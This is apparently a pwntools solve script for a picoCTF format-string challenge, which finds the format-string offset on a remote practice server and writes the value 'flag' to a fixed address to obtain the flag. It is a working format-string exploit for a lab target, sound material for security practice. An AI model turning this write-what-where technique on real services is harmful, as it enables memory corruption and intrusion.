from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 56086)

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 56086)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)